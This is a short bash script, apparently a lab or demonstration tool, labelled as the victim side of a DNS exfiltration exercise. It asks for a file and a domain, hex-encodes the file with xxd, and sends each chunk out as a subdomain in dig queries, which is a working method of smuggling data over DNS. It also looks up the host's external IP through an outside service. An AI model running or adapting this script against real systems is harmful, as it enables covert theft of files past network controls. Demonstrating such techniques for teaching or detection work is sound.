#!/bin/bash
echo
echo "#######################################################################"
echo "########################DNS EXFILTRATION VICTIM########################"
echo "#######################################################################"

echo
echo "Your external IP address is: " $(curl -s ipv4.icanhazip.com)

echo
echo "Type a file name to encode and exfiltrate, the press ENTER: "
read encfile

echo
echo "Type a bogus domain name to use for the DNS queries, then press ENTER: "
read domain

echo
echo "Make sure the attacker is running and press ENTER to continue: "
read choice

for line in $(cat $encfile | xxd -p)
do
dig $line.$domain
done
